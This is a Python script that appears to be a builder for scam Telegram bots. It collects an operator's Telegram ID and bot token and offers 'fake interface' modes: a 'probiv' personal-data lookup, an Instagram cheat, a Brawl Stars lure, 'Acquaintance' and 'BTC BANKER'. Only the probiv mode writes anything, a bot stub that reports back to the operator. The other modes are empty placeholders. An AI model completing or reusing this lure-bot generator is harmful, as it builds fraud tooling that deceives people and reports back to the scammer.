import colorama
from colorama import Fore
import os

def main_menu():
    print(Fore.CYAN + '''
    [1] Punched the number
    [2] Instagram cheat
    [3] Brawl stars
    [4] Acquaintance
    [5] BTC BANKER
    ''')

# Clear the terminal screen
os.system('clear')

# Print a decorative message
print(Fore.RED + '''
     _,.-------.,_
    ''')

# Ask the user to enter a number
user_input = input(Fore.GREEN + "Enter a number: ")

# Check if the entered number contains "12" as a substring
if "12" in user_input:
    print('Correct! You entered a number containing "12"')
    os.system('clear')
    print(Fore.YELLOW + '-----------------------------------------')
    
    # Ask for user input
    userid = input(Fore.RED + "Enter your Telegram ID > ")
    token = input(Fore.BLUE + "Enter your bot token > ")

    # Display the main menu
    main_menu()

    # Get user's choice
    choice = input(Fore.MAGENTA + "Select the fake interface option: >>> ")

    if not choice.isdigit():
        print("Error, option must be numeric")
    else:
        choice = int(choice)

        # Perform actions based on user's choice
        if choice == 1:
            f = open('probiv.py', 'w+', encoding='utf-8')
            f.write(f"""
import telebot
from telebot import types
import time
import random

ID = '{userid}'
bot = telebot.TeleBot("{token}")
adr = ['Tverskaya street, house 13', '60th Anniversary of October Avenue', 'Vinokurova Street', '3rd Golutvinsky Lane']
bot.send_message(ID, '!BOT STARTED!') 
print("The bot is running!")

# Your mode code here...
""")
            print("Punched the number mode code has been written to 'probiv.py'")
        elif choice == 2:
            # Add code for Instagram cheat mode here...
            print("Instagram cheat mode placeholder.")
        elif choice == 3:
            # Add code for Brawl Stars mode here...
            print("Brawl Stars mode placeholder.")
        elif choice == 4:
            # Add code for Acquaintance mode here...
            pass
        elif choice == 5:
            # Add code for BTC BANKER mode here...
            pass
        else:
            print("Invalid choice!")

else:
    print('Sorry, the entered number does not contain "12"')
